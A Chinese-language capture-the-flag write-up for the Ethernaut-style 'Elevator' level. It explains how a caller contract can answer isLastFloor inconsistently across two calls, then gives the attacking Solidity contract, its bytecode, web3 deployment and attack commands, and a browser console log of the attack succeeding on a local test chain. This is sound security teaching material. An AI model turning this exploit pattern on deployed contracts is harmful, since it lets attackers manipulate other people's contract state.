# 12 Elevtor.md

## 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

目标:  正常情况下调用`Elevator`的`goto`函数后, `top`属性应该始终返回`false`, 想办法让`top`属性返回`true`

```solidity
 if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
```

观察上面的代码 `top = building.isLastFloor(floor);`被赋值, 如果`building.isLastFloor(floor)`返回`true`,  但 `if (! building.isLastFloor(_floor))`则不会进入. 看似两者是相矛盾的, 所以要第一次调用 `building.isLastFloor(_floor)`时其返回`false`, 第二次调用时又返回`true`

在 `Building building = Building(msg.sender);`中, 表示`msg.sender`可以转化成`Building`接口的合约. 这就告诉了我要使用一个合约来调用`Elevator`的`goto`函数, 并且该合约要实现`Building`接口

综上:

1 要使用一个合约来调用`Elevator`的`goto`函数

2 该合约要实现`Building`接口

3, 该合约实现的`Building`接口的`isLastFloor`函数第一次调用返回`false`, 第二次调用时又返回`true`

所以:

```solidity
contract MyBuiding {
    uint256 private callCount;

    function isLastFloor(uint256 _f) external returns (bool) {
        callCount += 1;
        // _f >= 0 没有实际意义， 仅仅是为了消除_f的unused编译警告
        // 第一次调用isLastFloor， callCount % 2 == 0 返回 false
        // 第二次调用isLastFloor， callCount % 2 == 0 返回 true
        return _f >= 0 && callCount % 2 == 0;
    }

    function attack(address _elevator) public {
        Elevator e = Elevator(_elevator);
        e.goTo(1);
    }
}
```



```js
let abi = [{"inputs":[{"internalType":"address","name":"_elevator","type":"address"}],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_f","type":"uint256"}],"name":"isLastFloor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];



let byteCode = "0x" +
"608060405234801561001057600080fd5b506103e0806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80635f9a4bca1461003b578063d018db3e1461006b575b600080fd5b61005560048036038101906100509190610177565b610087565b60405161006291906101bf565b60405180910390f35b61008560048036038101906100809190610238565b6100c7565b005b6000600160008082825461009b9190610294565b925050819055506000821180156100c05750600060026000546100be9190610319565b145b9050919050565b60008190508073ffffffffffffffffffffffffffffffffffffffff1663ed9a713460016040518263ffffffff1660e01b8152600401610106919061038f565b600060405180830381600087803b15801561012057600080fd5b505af1158015610134573d6000803e3d6000fd5b505050505050565b600080fd5b6000819050919050565b61015481610141565b811461015f57600080fd5b50565b6000813590506101718161014b565b92915050565b60006020828403121561018d5761018c61013c565b5b600061019b84828501610162565b91505092915050565b60008115159050919050565b6101b9816101a4565b82525050565b60006020820190506101d460008301846101b0565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610205826101da565b9050919050565b610215816101fa565b811461022057600080fd5b50565b6000813590506102328161020c565b92915050565b60006020828403121561024e5761024d61013c565b5b600061025c84828501610223565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061029f82610141565b91506102aa83610141565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156102df576102de610265565b5b828201905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061032482610141565b915061032f83610141565b92508261033f5761033e6102ea565b5b828206905092915050565b6000819050919050565b6000819050919050565b600061037961037461036f8461034a565b610354565b610141565b9050919050565b6103898161035e565b82525050565b60006020820190506103a46000830184610380565b9291505056fea2646970667358221220bcd7505887c3eacb95a9b1bbf54744aca5773fc14e35423dae000e8e4f44b2b364736f6c634300080f0033";


//deploy it
let myContract = new web3.eth.Contract(abi);
let deploy = myContract.deploy({
	data: byteCode,
	arguments: []
});
let myInstance = await deploy.send({
	from: player
});

//attack
await myInstance.methods.attack(instance).send({from:player});

//check
let isTop = await contract.top();
console.log(isTop);
```



### 参考答案

```
DevTools failed to load source map: Could not load content for chrome-extension://dmkamcknogkgcdfhhbddcghachkejeap/browser-polyfill.js.map: HTTP error: status code 404, net::ERR_UNKNOWN_URL_SCHEME
log.js:24 [HMR] Waiting for update signal from WDS...
react-dom.development.js:29840 Download the React DevTools for a better development experience: https://reactjs.org/link/react-devtools
redux-logger.js:1  action CONNECT_WEB3 @ 17:13:11.457
crack.js:1 super_copy_cracked:false
^^.js:103 src/middlewares/loadGamedata.js  Line 16:13:  'network' is assigned a value but never used  no-unused-varssrc/middlewares/setNetwork.js  Line 85:3:  'onWrongNetwork' is assigned a value but never used  no-unused-vars
logger.warn @ ^^.js:103
printWarnings @ webpackHotDevClient.js:138
handleWarnings @ webpackHotDevClient.js:143
push.../node_modules/react-dev-utils/webpackHotDevClient.js.connection.onmessage @ webpackHotDevClient.js:210
setNetwork.js:83 id:1337, all id:5,420,1337,80001,421613,11155111
^^.js:35 => Current network: local
redux-logger.js:1  action SET_NETWORK_ID @ 17:13:11.629
redux-logger.js:1  action LOAD_GAME_DATA @ 17:13:11.630
^^.js:56 Elevator
^^.js:113 输入 help() 获得web3加载项
^^.js:35 => 关卡地址0x8241149f5f569232c76f59b225876920604ADca7
redux-logger.js:1  action ACTIVATE_LEVEL @ 17:13:11.670
redux-logger.js:1  action CONNECT_WEB3 @ 17:13:14.298
^^.js:35 => 玩家地址0xD5101aB11106B9F5d8b2a2bE42d1a5F6f5745Ca6
redux-logger.js:1  action SET_PLAYER_ADDRESS @ 17:13:14.307
redux-logger.js:1  action LOAD_ETHERNAUT_CONTRACT @ 17:13:14.309
redux-logger.js:1  action SET_BLOCK_NUM @ 17:13:14.346
redux-logger.js:1  action SET_GAS_PRICE @ 17:13:14.348
setNetwork.js:83 id:1672387581466, all id:5,420,1337,80001,421613,11155111
^^.js:35 => Current network: local
redux-logger.js:1  action SET_NETWORK_ID @ 17:13:14.348
^^.js:35 => 以太坊地址0x79D04762c3dD0dA858aB06682402cE6AA7CbcA45
redux-logger.js:1  action SYNC_PLAYER_PROGRESS @ 17:13:14.379
^^.js:35 => 实例地址0x96D33F5AcE36350933020b4A1840659272de0b33
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 17:13:14.380
^^.js:45 ヽ(￣(ｴ)￣)ﾉ 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 17:13:15.297
index.js:1 [OptinMonster],[object XMLHttpRequest]
console.<computed> @ index.js:1
logger.error @ ^^.js:93
S.error @ api.min.js:1
errors @ api.min.js:1
(anonymous) @ api.min.js:1
Promise.catch (async)
getCampaigns @ api.min.js:1
init @ api.min.js:1
init @ api.min.js:1
preInit @ api.min.js:1
c @ api.min.js:1
(anonymous) @ api.min.js:1
(anonymous) @ api.min.js:1
(anonymous) @ api.min.js:1
api.min.js:1 GET https://campaigns.openzeppelin.com/api/v2/embed/131584?d=localhost net::ERR_CONNECTION_CLOSED
(anonymous) @ api.min.js:1
send @ api.min.js:1
getCampaigns @ api.min.js:1
init @ api.min.js:1
init @ api.min.js:1
preInit @ api.min.js:1
c @ api.min.js:1
(anonymous) @ api.min.js:1
(anonymous) @ api.min.js:1
(anonymous) @ api.min.js:1
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x0e1db8f76ca92adbb0c625aa27d9cda51288db8748456513e46d9ef9cc7caedc
^^.js:35 => 实例地址0x57E5967F43048f20c4d5F66237d02EBDa6B8f883
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 17:13:21.078
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x0e1db8f76ca92adbb0c625aa27d9cda51288db8748456513e46d9ef9cc7caedc
redux-logger.js:1  action SET_BLOCK_NUM @ 17:13:24.329

let abi = [{"inputs":[{"internalType":"address","name":"_elevator","type":"address"}],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_f","type":"uint256"}],"name":"isLastFloor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];



let byteCode = "0x" +
"608060405234801561001057600080fd5b506103e0806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80635f9a4bca1461003b578063d018db3e1461006b575b600080fd5b61005560048036038101906100509190610177565b610087565b60405161006291906101bf565b60405180910390f35b61008560048036038101906100809190610238565b6100c7565b005b6000600160008082825461009b9190610294565b925050819055506000821180156100c05750600060026000546100be9190610319565b145b9050919050565b60008190508073ffffffffffffffffffffffffffffffffffffffff1663ed9a713460016040518263ffffffff1660e01b8152600401610106919061038f565b600060405180830381600087803b15801561012057600080fd5b505af1158015610134573d6000803e3d6000fd5b505050505050565b600080fd5b6000819050919050565b61015481610141565b811461015f57600080fd5b50565b6000813590506101718161014b565b92915050565b60006020828403121561018d5761018c61013c565b5b600061019b84828501610162565b91505092915050565b60008115159050919050565b6101b9816101a4565b82525050565b60006020820190506101d460008301846101b0565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610205826101da565b9050919050565b610215816101fa565b811461022057600080fd5b50565b6000813590506102328161020c565b92915050565b60006020828403121561024e5761024d61013c565b5b600061025c84828501610223565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061029f82610141565b91506102aa83610141565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156102df576102de610265565b5b828201905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061032482610141565b915061032f83610141565b92508261033f5761033e6102ea565b5b828206905092915050565b6000819050919050565b6000819050919050565b600061037961037461036f8461034a565b610354565b610141565b9050919050565b6103898161035e565b82525050565b60006020820190506103a46000830184610380565b9291505056fea2646970667358221220bcd7505887c3eacb95a9b1bbf54744aca5773fc14e35423dae000e8e4f44b2b364736f6c634300080f0033";


//deploy it
let myContract = new web3.eth.Contract(abi);
let deploy = myContract.deploy({
	data: byteCode,
	arguments: []
});
let myInstance = await deploy.send({
	from: player
});

await myInstance.methods.attack(instance, 11).send({from:player});

let isTop = await contract.top();
console.log(isTop);

^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xbcb953ed691f8a4ade13aa8c960a726e46223d117be45f4de974ba87dc25f617
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xbcb953ed691f8a4ade13aa8c960a726e46223d117be45f4de974ba87dc25f617
web3.min.js:22 Uncaught Error: Invalid number of parameters for "attack". Got 2 expected 1!
    at Object.InvalidNumberOfParams (web3.min.js:22)
    at Object.y._createTxObject (web3.min.js:22)
    at <anonymous>:20:26
InvalidNumberOfParams @ web3.min.js:22
y._createTxObject @ web3.min.js:22
(anonymous) @ VM486:20
setTimeout (async)
f @ web3.min.js:9
o.nextTick @ web3.min.js:9
(anonymous) @ web3.min.js:22
Promise.then (async)
bound bound request @ web3.min.js:22
u.send @ web3.min.js:22
u @ web3.min.js:10
n @ web3.min.js:10
(anonymous) @ web3.min.js:10
c @ web3.min.js:46
(anonymous) @ web3.min.js:46
(anonymous) @ web3.min.js:46
n @ web3.min.js:22
s @ web3.min.js:22
(anonymous) @ web3.min.js:22
(anonymous) @ web3.min.js:22
(anonymous) @ web3.min.js:10
Promise.then (async)
x @ web3.min.js:10
(anonymous) @ web3.min.js:10
Promise.then (async)
m._confirmTransaction @ web3.min.js:10
a @ web3.min.js:10
a @ web3.min.js:22
b.run @ web3.min.js:9
p @ web3.min.js:9
setTimeout (async)
f @ web3.min.js:9
o.nextTick @ web3.min.js:9
(anonymous) @ web3.min.js:22
Promise.then (async)
bound bound request @ web3.min.js:22
u.send @ web3.min.js:22
u @ web3.min.js:10
(anonymous) @ web3.min.js:10
Promise.then (async)
n @ web3.min.js:10
y._executeMethod @ web3.min.js:22
(anonymous) @ VM486:16
redux-logger.js:1  action SET_BLOCK_NUM @ 17:13:34.330

await myInstance.methods.attack(instance).send({from:player});
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x7b4fd89465e2e6d6ef3ad8ad4a56f6efc634a25cf0ff66785ab1da934b1d52b0
{transactionHash: "0x7b4fd89465e2e6d6ef3ad8ad4a56f6efc634a25cf0ff66785ab1da934b1d52b0", transactionIndex: 0, blockNumber: 135, blockHash: "0x8c8d14e45560ebeb5cf0e737a83bdd61ffbdefafab5441f1049e850c9418a433", from: "0xd5101ab11106b9f5d8b2a2be42d1a5f6f5745ca6", …}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x7b4fd89465e2e6d6ef3ad8ad4a56f6efc634a25cf0ff66785ab1da934b1d52b0
^^.js:45 ≧◔◡◔≦ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 17:14:03.220
redux-logger.js:1  action SET_BLOCK_NUM @ 17:14:05.285
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x945a2b0535c5e2219b83d31798a9b1779b93dee55c19b0acdd71b6f0e52a3bee
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x945a2b0535c5e2219b83d31798a9b1779b93dee55c19b0acdd71b6f0e52a3bee
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:73 <>_<> 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 17:14:14.329

```

